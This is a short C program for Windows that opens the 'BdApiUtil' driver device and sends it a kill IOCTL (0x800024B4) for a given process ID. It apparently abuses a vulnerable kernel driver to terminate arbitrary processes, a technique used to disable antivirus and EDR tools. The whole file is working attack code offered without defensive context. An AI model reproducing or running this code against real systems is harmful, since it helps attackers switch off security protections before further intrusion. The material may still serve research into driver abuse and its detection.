#include <Windows.h>
#include <stdio.h>

#define KILL_IOCTL_CODE 0x800024B4
#define DRIVER_DEVICE L"\\\\.\\BdApiUtil"

int main(int argc, char* argv[]) {
	DWORD PID;
	if (argc < 2) {
		printf("Provide a PID\n%s <PID>", argv[0]);
		PID = 15100;
	}
	else {
		printf("Targetting PID %d", atoi(argv[1]));
		PID = atoi(argv[1]);
	}

	HANDLE hDriver = CreateFileW(DRIVER_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver) {
		printf("SymLink unavailable!");
		exit(1);
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];
	BOOL ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &PID, sizeof(PID), &outBuffer, 256, &bytesReturned, NULL);
	if (ioctl_result) {
		printf("Must've Died");
	}
	else {
		printf("Something botched up :(");
	}
}